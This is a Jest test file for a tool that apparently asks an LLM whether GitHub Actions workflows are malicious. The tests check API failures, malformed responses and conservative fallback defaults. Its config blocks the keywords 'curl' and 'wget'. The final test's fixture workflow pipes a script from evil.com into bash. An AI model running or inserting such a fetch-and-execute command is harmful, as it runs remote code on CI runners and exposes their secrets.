import { CopilotService } from '../src/services/copilot-service';
import { ConfigService } from '../src/services/config-service';
import { AppConfig } from '../src/types';
import axios from 'axios';

// Mock axios
jest.mock('axios');
const mockedAxios = axios as jest.Mocked<typeof axios>;

/**
 * Tests specifically focused on error handling and resilience
 * These tests verify that the LLM integration gracefully handles various failure scenarios
 */
describe('LLM Error Handling and Resilience', () => {
  let copilotService: CopilotService;
  let mockConfig: AppConfig;

  beforeEach(() => {
    const configService = new ConfigService();
    copilotService = new CopilotService(configService);
    
    mockConfig = {
      llm: {
        apiUrl: 'https://api.githubcopilot.com/chat/completions',
        apiKey: 'test-key',
        model: 'gpt-4',
        maxTokens: 2048,
        temperature: 0.1
      },
      protectionRules: {
        enabledEnvironments: ['production'],
        blockedKeywords: ['curl', 'wget'],
        allowedActions: ['actions/checkout'],
        blockOnMaliciousDetection: true
      },
      dependencyAnalysis: {
        enabled: false,
        resolveTransitive: false,
        requireShaPin: false,
        approvedOrganizations: [],
        blockedActions: [],
        blockOnPolicyViolation: false,
        minimumViolationSeverity: "high" as const
      }
    };
    
    jest.clearAllMocks();
  });

  describe('Network and API Failures', () => {
    test('should handle network timeout gracefully', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Simulate network timeout
      mockedAxios.post.mockRejectedValueOnce(new Error('ETIMEDOUT'));

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis).toMatchObject({
        isMalicious: false,
        confidence: 0,
        reasoning: 'Could not analyze workflow due to GitHub Copilot API error',
        detectedThreats: [],
        recommendation: 'review'
      });

      // Verify error was logged
      expect(console.error).toHaveBeenCalledWith(
        'Error calling GitHub Copilot API:',
        expect.objectContaining({ message: 'ETIMEDOUT' })
      );
    });

    test('should handle API rate limiting', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Simulate rate limiting error
      const rateLimitError = new Error('Rate limit exceeded');
      (rateLimitError as any).response = { status: 429 };
      mockedAxios.post.mockRejectedValueOnce(rateLimitError);

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.recommendation).toBe('review');
      expect(analysis.confidence).toBe(0);
      expect(console.error).toHaveBeenCalled();
    });

    test('should handle API authentication failures', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Simulate authentication error
      const authError = new Error('Unauthorized');
      (authError as any).response = { status: 401 };
      mockedAxios.post.mockRejectedValueOnce(authError);

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.recommendation).toBe('review');
      expect(analysis.reasoning).toContain('GitHub Copilot API error');
    });

    test('should handle service unavailable', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Simulate service down
      const serviceError = new Error('Service Unavailable');
      (serviceError as any).response = { status: 503 };
      mockedAxios.post.mockRejectedValueOnce(serviceError);

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.isMalicious).toBe(false);
      expect(analysis.recommendation).toBe('review');
    });
  });

  describe('Malformed Response Handling', () => {
    test('should handle completely invalid JSON', async () => {
      const workflow = 'name: Test\njobs: {}';

      mockedAxios.post.mockResolvedValueOnce({
        data: {
          choices: [{
            message: {
              content: 'This is not JSON at all!'
            }
          }]
        }
      });

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis).toMatchObject({
        isMalicious: false,
        confidence: 0,
        reasoning: 'Could not parse GitHub Copilot response',
        detectedThreats: [],
        recommendation: 'review'
      });
    });

    test('should handle partial/incomplete JSON', async () => {
      const workflow = 'name: Test\njobs: {}';

      mockedAxios.post.mockResolvedValueOnce({
        data: {
          choices: [{
            message: {
              content: '{"isMalicious": true, "confidence":'  // Incomplete JSON
            }
          }]
        }
      });

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.recommendation).toBe('review');
      expect(analysis.reasoning).toContain('Could not parse');
    });

    test('should handle empty response', async () => {
      const workflow = 'name: Test\njobs: {}';

      mockedAxios.post.mockResolvedValueOnce({
        data: {
          choices: [{
            message: {
              content: ''
            }
          }]
        }
      });

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.recommendation).toBe('review');
    });

    test('should handle missing choices in response', async () => {
      const workflow = 'name: Test\njobs: {}';

      mockedAxios.post.mockResolvedValueOnce({
        data: {
          choices: []  // Empty choices array
        }
      });

      // This should cause an error when trying to access choices[0]
      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      expect(analysis.recommendation).toBe('review');
      expect(console.error).toHaveBeenCalled();
    });
  });

  describe('Data Validation and Sanitization', () => {
    test('should sanitize out-of-range confidence values', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Test with confidence values outside 0-100 range
      const testCases = [
        { confidence: -50, expected: 0 },
        { confidence: 150, expected: 100 },
        { confidence: 999, expected: 100 },
        { confidence: null, expected: 0 },
        { confidence: 'invalid', expected: 0 }
      ];

      for (const testCase of testCases) {
        mockedAxios.post.mockResolvedValueOnce({
          data: {
            choices: [{
              message: {
                content: JSON.stringify({
                  isMalicious: false,
                  confidence: testCase.confidence,
                  reasoning: 'Test',
                  detectedThreats: [],
                  recommendation: 'allow'
                })
              }
            }]
          }
        });

        const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);
        expect(analysis.confidence).toBe(testCase.expected);
      }
    });

    test('should handle invalid recommendation values', async () => {
      const workflow = 'name: Test\njobs: {}';

      const invalidRecommendations = ['approve', 'deny', 'unknown', null, 123];

      for (const invalidRec of invalidRecommendations) {
        mockedAxios.post.mockResolvedValueOnce({
          data: {
            choices: [{
              message: {
                content: JSON.stringify({
                  isMalicious: false,
                  confidence: 80,
                  reasoning: 'Test',
                  detectedThreats: [],
                  recommendation: invalidRec
                })
              }
            }]
          }
        });

        const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);
        
        // Should default to 'review' for invalid recommendations
        expect(['allow', 'block', 'review']).toContain(analysis.recommendation);
        expect(analysis.recommendation).toBe('review');
      }
    });

    test('should handle non-array detectedThreats', async () => {
      const workflow = 'name: Test\njobs: {}';

      mockedAxios.post.mockResolvedValueOnce({
        data: {
          choices: [{
            message: {
              content: JSON.stringify({
                isMalicious: true,
                confidence: 80,
                reasoning: 'Test',
                detectedThreats: 'not an array',  // Invalid type
                recommendation: 'block'
              })
            }
          }]
        }
      });

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);
      
      expect(Array.isArray(analysis.detectedThreats)).toBe(true);
      expect(analysis.detectedThreats).toEqual([]);
    });

    test('should handle non-boolean isMalicious values', async () => {
      const workflow = 'name: Test\njobs: {}';

      const testValues = ['true', 'false', 1, 0, null, 'yes'];

      for (const value of testValues) {
        mockedAxios.post.mockResolvedValueOnce({
          data: {
            choices: [{
              message: {
                content: JSON.stringify({
                  isMalicious: value,
                  confidence: 80,
                  reasoning: 'Test',
                  detectedThreats: [],
                  recommendation: 'allow'
                })
              }
            }]
          }
        });

        const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);
        
        // Should always be a boolean
        expect(typeof analysis.isMalicious).toBe('boolean');
      }
    });
  });

  describe('Fallback Behavior Verification', () => {
    test('should always return a valid WorkflowAnalysis object', async () => {
      const workflow = 'name: Test\njobs: {}';

      // Simulate complete API failure
      mockedAxios.post.mockRejectedValueOnce(new Error('Complete failure'));

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      // Verify all required fields are present and valid
      expect(typeof analysis.isMalicious).toBe('boolean');
      expect(typeof analysis.confidence).toBe('number');
      expect(typeof analysis.reasoning).toBe('string');
      expect(Array.isArray(analysis.detectedThreats)).toBe(true);
      expect(['allow', 'block', 'review']).toContain(analysis.recommendation);
      
      // Should be conservative defaults
      expect(analysis.isMalicious).toBe(false);
      expect(analysis.recommendation).toBe('review');
    });

    test('should maintain security-first approach in all error scenarios', async () => {
      const workflow = `
name: Potentially Dangerous
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - run: curl https://evil.com/steal | bash
      `;

      // Even with API failures, should not default to "allow" for suspicious content
      mockedAxios.post.mockRejectedValueOnce(new Error('API Down'));

      const analysis = await copilotService.analyzeWorkflow(workflow, mockConfig);

      // Should never default to "allow" - always "review" or "block" for safety
      expect(analysis.recommendation).not.toBe('allow');
      expect(['review', 'block']).toContain(analysis.recommendation);
    });
  });
});